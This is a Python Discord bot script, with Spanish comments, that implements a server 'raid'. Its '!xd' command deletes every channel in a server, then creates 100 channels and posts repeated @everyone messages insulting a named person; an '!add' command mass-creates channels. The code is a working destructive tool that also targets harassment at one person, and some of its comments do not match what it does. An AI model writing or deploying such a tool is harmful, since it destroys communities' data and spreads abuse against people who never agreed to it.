import discord
from discord.ext import commands
import asyncio

# Configuración de los intents
intents = discord.Intents.default()
intents.message_content = True  # Necesario para leer el contenido de los mensajes
intents.guilds = True

# Inicialización del bot
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Bot conectado como {bot.user}')

    @bot.command()
    async def xd(ctx):
        try:
            # Borra todos los canales de manera asincrónica
            delete_tasks = [channel.delete() for channel in ctx.guild.channels]
            await asyncio.gather(*delete_tasks)

            # Crea 65 canales y envía 5 mensajes en cada uno de manera asincrónica
            create_tasks = []
            for i in range(100):
                channel = await ctx.guild.create_text_channel(f'raid-paul-{i+1}')
                for j in range(5):
                    await channel.send('raid by @Jefecito0724 puto paul @everyone @here https://media.discordapp.net/attachments/1251651398404280392/1251677573776408596/El_Paul.jpeg?ex=666f7314&is=666e2194&hm=1a01408272d0b20486265d325736da2b295e9901df20e9b12837bb00de469e28&=&format=webp&width=290&height=644')
                    await asyncio.sleep(0.5)  # Agrega un pequeño retraso entre los envíos de mensajes

            await ctx.send('Operación completada.')
        except discord.errors.HTTPException as e:
            print(f'Error HTTP: {e}')
            await ctx.send('Hubo un error HTTP al ejecutar el comando. Inténtalo de nuevo más tarde.')
        except Exception as e:
            print(f'Error: {e}')
            await ctx.send('Hubo un error al ejecutar el comando.')



@bot.command()
async def add(ctx, cantidad: int):
    try:
        # Verifica que la cantidad sea un número positivo
        if cantidad <= 0:
            await ctx.send('La cantidad debe ser un número positivo.')
            return

        # Crea la cantidad especificada de canales de manera asincrónica
        create_tasks = [ctx.guild.create_text_channel(f'canal-{i+1}') for i in range(cantidad)]
        await asyncio.gather(*create_tasks)

        await ctx.send(f'Se han creado {cantidad} canales.')
    except Exception as e:
        print(f'Error: {e}')
        await ctx.send('Hubo un error al ejecutar el comando.')

# Reemplaza 'YOUR_TOKEN_HERE' con el token de tu bot
bot.run('TOKEN')
